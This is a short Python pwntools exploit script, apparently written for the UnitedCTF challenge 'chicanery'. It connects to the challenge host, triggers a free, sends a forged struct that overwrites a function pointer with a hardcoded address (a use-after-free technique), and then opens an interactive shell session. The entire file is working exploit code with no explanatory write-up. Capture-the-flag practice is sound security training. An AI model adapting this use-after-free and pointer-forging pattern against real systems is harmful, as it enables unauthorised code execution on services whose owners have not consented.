from pwn import *
import argparse 
from time import sleep

def main():
    args = parsing()

    if args.local:
        proc = process("chicanery")
    else:
        proc = remote("nc.ctf.unitedctf.ca", 4004)
    if args.debug:
        gdb.attach(proc, "")

    # print(proc.recv().strip().decode())
    print(proc.recvuntil(b"> ").strip().decode())
    
    print("--> Freeing the string")
    proc.sendline(b"1")

    print(proc.recvuntil(b"> ").strip().decode())

    print("--> Option 2")
    proc.sendline(b"2")
    
    print(proc.recvuntil(b"> ").strip().decode())
    
    print("--> forging the struct")
    chicanery = 0x400a4c
    proc.sendline(b"pen\x00BBBB"+p64(chicanery))

    print(proc.recvuntil(b"> ").strip().decode())
    proc.sendline(b"1")

    

    proc.interactive()


def parsing():
    parser = argparse.ArgumentParser(description='Parse args')
    parser.add_argument('-d', '--debug', dest='debug', action='store_true',
                    help='Active debug mode')
    parser.add_argument('-l', '--local', dest='local', action='store_true',
                    help='Start local process')
    return parser.parse_args()

if __name__ == "__main__":
    main()
